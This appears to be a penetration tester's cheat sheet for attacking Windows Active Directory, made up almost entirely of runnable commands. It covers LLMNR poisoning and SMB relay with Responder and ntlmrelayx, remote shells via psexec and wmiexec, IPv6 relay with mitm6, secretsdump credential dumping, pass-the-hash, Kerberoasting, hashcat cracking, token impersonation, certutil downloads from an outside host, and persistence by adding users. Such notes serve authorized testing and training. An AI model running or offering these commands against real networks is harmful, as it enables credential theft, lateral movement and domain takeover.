# LLMNR Poisoning Attack

```shell
responder -I <interface> -rdwv
# Target -> File Explorer -> \\ATTACKER_IP
hashcat -m 5600 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
```

---

# SMB Relay Attack

```shell
nmap --script=smb2-security-mode.nse -p 445 <IP_ADDR>
nano /etc/responder/Responder.conf
> SMB = Off
> HTTP = Off

responder -I <interface> -rdwv
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.py -smb2support
# Target -> File Explorer -> \\ATTACKER_IP
```

---

# Gaining Shell Access

```shell
msfconsole -> use exploit/windows/smb/psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<user>:<password>@<IP_ADDR>
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py <domain>/<user>:<password>@<IP_ADDR>
python3 /usr/share/doc/python3-impacket/examples/smbexec.py <domain>/<user>:<password>@<IP_ADDR>
```

---

# IPv6 Attacks

```shell
mitm6 -d <domain>
python3 /usr/share/doc/python3-impacket/ntlmrelayx.py -6 -t ldaps://<IP_ADDR> -wh <domain> -l <name>
# reboot
```

---

# PowerView

```powershell
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
Get-NetUser
Get-UserProperty
Get-NetComputer
Get-NetGroup
Get-NetGroupMember
Invoke-ShareFinder
Get-NetGPO
```

---

# Bloodhound

```powershell
powershell -ep bypass
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName <filename.zip>
```

---

# Pass The Password Attack

```shell
crackmapexec 192.168.1.0/24 -u <username> -d <domain> -p <password>
python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<user>:<password>@<IP_ADDR>
```

---

# Pass The Hash Attack

```shell
python3 /usr/shares/doc/python3-impacket/examples/secretsdump.py <domain>/<user>:<password>@<IP_ADDR>
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
crackmapexec 192.168.1.0/24 -u <user> -H <HASH> --local
python3 /usr/shares/doc/python3-impacket/examples/psexec.py <user>@<IP_ADDR> -hashes <HASH>
```

---

# Token Impersonation

```shell
load incognito
list_tokens -u
impersonate_token <domain>\\<user>
```

---

# Kerberoasting

```shell
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain>/<user>:<password> -dc-ip <IP_ADDR> -request
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

---

# GPP (Group Policy Preferences) Attack

```shell
gpp-decrypt <password>
```

---

# PrintNightmare

```powershell
# https://github.com/cube0x0/CVE-2021-1675
```

---

# ZeroLogon

```powershell
# https://github.com/dirkjanm/CVE-2020-1472
```

---

# File Transfers Review

```powershell
# Certutil
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
# HTTP
python -m http.server
# FTP
python -m pyftpdlib 21
# Linux
wget
```

--- 

# Maintaining Access

- Persistence Scripts
1. run persistence -h
2. exploit/windows/local/persistence
3. exploit/windows/local/registry_persistence

- Scheduled Tasks
1. run schtaskabuse
2. Add a user
3. net user <user> <password> /add